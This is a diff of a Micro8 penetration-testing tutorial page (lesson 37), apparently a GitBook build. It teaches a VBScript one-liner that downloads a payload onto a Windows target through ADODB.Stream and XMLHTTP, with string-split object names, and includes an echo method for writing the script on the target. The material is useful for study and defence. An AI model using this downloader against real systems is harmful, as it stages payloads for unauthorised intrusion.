@@ -1,14 +1,14 @@
 
 <!DOCTYPE HTML>
-<html lang="" >
+<html lang="zh-hans" >
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>第三十七课：vbs一句话下载payload · GitBook</title>
+        <title>第三十七课：vbs一句话下载payload · Micro8 系列教程</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.3">
-        
+        <meta name="author" content="Micro8 系列作者">
         
         
     
@@ -17,17 +17,33 @@
     
             
                 
-                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search-plus/search.css">
                 
             
                 
-                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-prism/prism-darcula.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-donate/plugin.css">
                 
             
                 
                 <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                 
             
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-theme-comscore/test.css">
+                
+            
         
 
     
@@ -47,6 +63,7 @@
     
 
         
+    
     
     
     <meta name="HandheldFriendly" content="true"/>
@@ -63,6 +80,17 @@
     <link rel="prev" href="36_解决vps上ssh掉线.html" />
     
 
+    <style>
+    @media only screen and (max-width: 640px) {
+        .book-header .hidden-mobile {
+            display: none;
+        }
+    }
+    </style>
+    <script>
+        window["gitbook-plugin-github-buttons"] = {"repo":"https://github.com/Micropoor/Micro8","types":["star","watch","fork"],"size":"small"};
+    </script>
+
     </head>
     <body>
         
@@ -71,7 +99,7 @@
         
             
 <div id="book-search-input" role="search">
-    <input type="text" placeholder="Type to search" />
+    <input type="text" placeholder="输入并搜索" />
 </div>
 
             
@@ -82,7 +110,21 @@
 <ul class="summary">
     
     
+    
+        
+        <li>
+            <a href="https://micropoor.blogspot.com" target="_blank" class="custom-link">Micropoor</a>
+        </li>
+    
+        
+        <li>
+            <a href="https://github.com/micro8" target="_blank" class="custom-link">Github Micro8</a>
+        </li>
+    
+    
 
+    
+    <li class="divider"></li>
     
 
     
@@ -1785,7 +1827,7 @@
 
     <li>
         <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
-            Published with GitBook
+            本书使用 GitBook 发布
         </a>
     </li>
 </ul>
@@ -1818,7 +1860,7 @@
                     <div class="page-wrapper" tabindex="-1" role="main">
                         <div class="page-inner">
                             
-<div id="book-search-results">
+<div class="search-plus" id="book-search-results">
     <div class="search-noresults">
     
                                 <section class="normal markdown-section">
@@ -1829,25 +1871,27 @@
 <p><strong>&#x9776;&#x673A;&#xFF1A;</strong>windows 2003  </p>
 <h3 id="vbs&#xFF1A;">vbs&#xFF1A;</h3>
 <p>&#x4FDD;&#x5B58;downfile.vbs</p>
-<pre><code class="lang-vbs"><span class="hljs-keyword">set</span> a=<span class="hljs-built_in">createobject</span>(<span class="hljs-string">&quot;adod&quot;</span>+<span class="hljs-string">&quot;b.stream&quot;</span>):<span class="hljs-keyword">set</span>
-w=<span class="hljs-built_in">createobject</span>(<span class="hljs-string">&quot;micro&quot;</span>+<span class="hljs-string">&quot;soft.xmlhttp&quot;</span>):w.open <span class="hljs-string">&quot;get&quot;</span>,wsh.arguments(<span class="hljs-number">0</span>),<span class="hljs-number">0</span>:w.send:a.type=<span class="hljs-number">1</span>:a.open:a.write w.responsebody:a.savetofile
-wsh.arguments(<span class="hljs-number">1</span>),<span class="hljs-number">2</span>
+<pre class="language-"><code class="lang-visual-basic"><span class="token keyword">set</span> a<span class="token operator">=</span>createobject<span class="token punctuation">(</span><span class="token string">&quot;adod&quot;</span><span class="token operator">+</span><span class="token string">&quot;b.stream&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">set</span>
+w<span class="token operator">=</span>createobject<span class="token punctuation">(</span><span class="token string">&quot;micro&quot;</span><span class="token operator">+</span><span class="token string">&quot;soft.xmlhttp&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>w<span class="token punctuation">.</span>open <span class="token string">&quot;get&quot;</span><span class="token punctuation">,</span>wsh<span class="token punctuation">.</span>arguments<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">:</span>w<span class="token punctuation">.</span>send<span class="token punctuation">:</span>a<span class="token punctuation">.</span>type<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">:</span>a<span class="token punctuation">.</span>open<span class="token punctuation">:</span>a<span class="token punctuation">.</span>write w<span class="token punctuation">.</span>responsebody<span class="token punctuation">:</span>a<span class="token punctuation">.</span>savetofile
+wsh<span class="token punctuation">.</span>arguments<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span>
 </code></pre>
 <h3 id="&#x547D;&#x4EE4;&#x884C;&#x4E0B;&#x6267;&#x884C;&#xFF1A;">&#x547D;&#x4EE4;&#x884C;&#x4E0B;&#x6267;&#x884C;&#xFF1A;</h3>
-<pre><code class="lang-bash">cscript downfile.vbs http://192.168.1.115/robots.txt C:\Inetpub\b.txt
+<pre class="language-"><code class="lang-bash">cscript downfile.vbs http://192.168.1.115/robots.txt C:\Inetpub\b.txt
 </code></pre>
 <p><img src="media/7f46749ce580dd58f217f4757f5f6529.jpg" alt=""></p>
 <p>&#x5F80;&#x5F80;&#x5728;&#x5B9E;&#x6218;&#x4E2D;&#xFF0C;&#x6CA1;&#x6709;&#x4E0A;&#x4F20;&#x7684;&#x65B9;&#x4FBF;&#x6761;&#x4EF6;&#xFF0C;&#x5C24;&#x5176;&#x662F;&#x76EE;&#x6807;&#x673A;&#x662F; windows&#xFF0C;&#x53EA;&#x6709; echo &#x65B9;&#x5F0F;&#x6765;&#x5199;&#x5165; vbs&#x3002;</p>
 <h3 id="&#x547D;&#x4EE4;&#x884C;&#x4E0B;&#x6267;&#x884C;&#xFF1A;">&#x547D;&#x4EE4;&#x884C;&#x4E0B;&#x6267;&#x884C;&#xFF1A;</h3>
-<pre><code class="lang-bash"><span class="hljs-built_in">echo</span> <span class="hljs-built_in">set</span> a=createobject(^<span class="hljs-string">&quot;adod^&quot;</span>+^<span class="hljs-string">&quot;b.stream^&quot;</span>):<span class="hljs-built_in">set</span>
-w=createobject(^<span class="hljs-string">&quot;micro^&quot;</span>+^<span class="hljs-string">&quot;soft.xmlhttp^&quot;</span>):w.open^<span class="hljs-string">&quot;get^&quot;</span>,wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile
-wsh.arguments(1),2 &gt;&gt;downfile.vbs
+<pre class="language-"><code class="lang-bash"><span class="token keyword">echo</span> <span class="token keyword">set</span> a<span class="token operator">=</span>createobject<span class="token punctuation">(</span>^<span class="token string">&quot;adod^&quot;</span>+^<span class="token string">&quot;b.stream^&quot;</span><span class="token punctuation">)</span>:set
+w<span class="token operator">=</span>createobject<span class="token punctuation">(</span>^<span class="token string">&quot;micro^&quot;</span>+^<span class="token string">&quot;soft.xmlhttp^&quot;</span><span class="token punctuation">)</span>:w.open^<span class="token string">&quot;get^&quot;</span>,wsh.arguments<span class="token punctuation">(</span>0<span class="token punctuation">)</span>,0:w.send:a.type<span class="token operator">=</span>1:a.open:a.write w.responsebody:a.savetofile
+wsh.arguments<span class="token punctuation">(</span>1<span class="token punctuation">)</span>,2 <span class="token operator">&gt;&gt;</span>downfile.vbs
 </code></pre>
 <p><strong>&#x4F18;&#x70B9;&#xFF1A;</strong>&#x652F;&#x6301;windows&#x5168;&#x7248;&#x672C;&#x7CFB;&#x5217;<br><strong>&#x7F3A;&#x70B9;&#xFF1A;</strong>&#x5BF9;https&#x4E0D;&#x53CB;&#x597D;</p>
 <blockquote>
 <p>  Micropoor</p>
 </blockquote>
-
+<footer class="page-footer"><span class="copyright">Copyright &#xA9; Micro8 2018 all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x4FEE;&#x8BA2;&#x65F6;&#x95F4;&#xFF1A;
+2019-02-25 20:34
+</span></footer>
                                 
                                 </section>
                             
@@ -1890,7 +1934,7 @@ wsh.arguments(1),2 &gt;&gt;downfile.vbs
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"第三十七课：vbs一句话下载payload","level":"1.4.37","depth":2,"next":{"title":"第三十八课：certutil一句话下载payload","level":"1.4.38","depth":2,"path":"Chapter1/38_certutil一句话下载payload.md","ref":"Chapter1/38_certutil一句话下载payload.md","articles":[]},"previous":{"title":"第三十六课：解决vps上ssh掉线","level":"1.4.36","depth":2,"path":"Chapter1/36_解决vps上ssh掉线.md","ref":"Chapter1/36_解决vps上ssh掉线.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"Chapter1/37_vbs一句话下载payload.md","mtime":"2019-02-23T09:27:23.253Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-02-25T04:00:06.266Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"第三十七课：vbs一句话下载payload","level":"1.4.37","depth":2,"next":{"title":"第三十八课：certutil一句话下载payload","level":"1.4.38","depth":2,"path":"Chapter1/38_certutil一句话下载payload.md","ref":"Chapter1/38_certutil一句话下载payload.md","articles":[]},"previous":{"title":"第三十六课：解决vps上ssh掉线","level":"1.4.36","depth":2,"path":"Chapter1/36_解决vps上ssh掉线.md","ref":"Chapter1/36_解决vps上ssh掉线.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr","-search","search-plus","-highlight","prism","theme-comscore","splitter","-sharing","sharing-plus","-expandable-chapters-small","simple-page-toc","github","github-buttons","tbfed-pagefooter","donate","ga"],"root":".","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"Copyright © Micro8 2018","modify_label":"修订时间：","modify_format":"YYYY-MM-DD HH:mm"},"prism":{"css":["prism-themes/themes/prism-darcula.css"]},"github":{"url":"https://github.com/micro8"},"simple-page-toc":{"maxDepth":3,"skipFirstH1":true},"splitter":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"donate":{"alipay":"","alipayText":"支付宝打赏","button":"赞赏码","title":"有读者问赞赏码，如下，自愿：","wechat":"./dashang.png","wechatText":""},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-comscore":{},"github-buttons":{"repo":"https://github.com/Micropoor/Micro8","types":["star","watch","fork"],"size":"small"},"ga":{"configuration":"auto","token":"UA-135003278-1"},"sharing":{"qq":false,"all":["facebook","google","twitter","weibo","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":false,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":false,"messenger":false,"line":false,"vk":false,"pocket":false,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"search-plus":{}},"theme":"default","author":"Micro8 系列作者","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Micro8 系列教程","language":"zh-hans","links":{"sidebar":{"Micropoor":"https://micropoor.blogspot.com","Github Micro8":"https://github.com/micro8"}},"gitbook":"*","description":"Micro8"},"file":{"path":"Chapter1/37_vbs一句话下载payload.md","mtime":"2019-02-25T12:34:19.290Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-02-25T13:55:17.972Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
@@ -1900,27 +1944,43 @@ wsh.arguments(1),2 &gt;&gt;downfile.vbs
     <script src="../gitbook/theme.js"></script>
     
         
-        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        <script src="../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
         
     
         
-        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        <script src="../gitbook/gitbook-plugin-search-plus/search.js"></script>
         
     
         
-        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        <script src="../gitbook/gitbook-plugin-splitter/splitter.js"></script>
         
     
         
-        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        <script src="../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
         
     
         
-        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        <script src="../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-github-buttons/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-donate/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-ga/plugin.js"></script>
         
     
         
         <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
         
     
 
